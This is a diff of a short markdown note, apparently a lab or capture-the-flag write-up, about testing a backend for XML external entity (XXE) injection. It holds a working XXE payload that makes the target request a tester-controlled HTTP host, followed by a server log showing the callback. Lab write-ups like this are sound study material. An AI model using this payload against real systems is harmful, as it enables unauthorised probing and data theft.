@@ -1,4 +1,4 @@
-# XXE
+# Entry point
 
 Example of an xml file that is passed to backend
 ```
@@ -13,13 +13,14 @@ Example of an xml file that is passed to backend
 </root>
 ```
 
-We can check for XXE vuln by declaring the following entity inside the <xml>
+We can check for XXE vuln by declaring the following entity inside the ```<?xml>``` and hosting an http server
 ```
 <!DOCTYPE test [ 
 <!ENTITY % xxe SYSTEM "http://10.10.16.8"> 
 %xxe;
 ]>
 ```
+
 ```
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 10.10.11.192 - - [12/May/2023 12:35:19] "GET / HTTP/1.1" 200 -
